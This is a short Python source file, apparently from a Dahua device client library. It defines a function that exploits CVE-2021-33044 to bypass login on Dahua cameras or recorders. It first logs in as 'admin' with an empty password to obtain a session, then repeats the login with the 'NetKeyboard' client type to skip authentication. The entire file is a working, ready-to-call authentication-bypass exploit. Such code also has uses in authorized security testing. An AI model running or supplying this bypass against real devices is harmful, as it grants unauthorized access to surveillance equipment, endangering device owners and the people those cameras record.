from dahua.client import DahuaRpc
from dahua.utils.logger import logger


def bypass_cve2021_33044(client: DahuaRpc) -> None:
    """Bypass login with CVE-2021-33044."""
    logger.info("Authentication Bypassing (CVE-2021-33044)...")

    # Step 1: Perform the initial login request to get the session and authentication parameters.
    request = client._global.login(
        {"userName": "admin", "password": "", "clientType": "Web3.0"}, verify=False
    )  # Can't verify first request, as it doesn't have a session yet.

    client.session_id = request.get("session")

    # Step 2: Use the session ID to perform the login request with the 'NetKeyboard' client type.
    client._global.login(
        {
            "userName": "admin",
            "password": "",
            "clientType": "NetKeyboard",  # Bypass CVE-2021-33044 by using 'NetKeyboard'
            "authorityType": "Default",
            "passwordType": "Default",
        }
    )
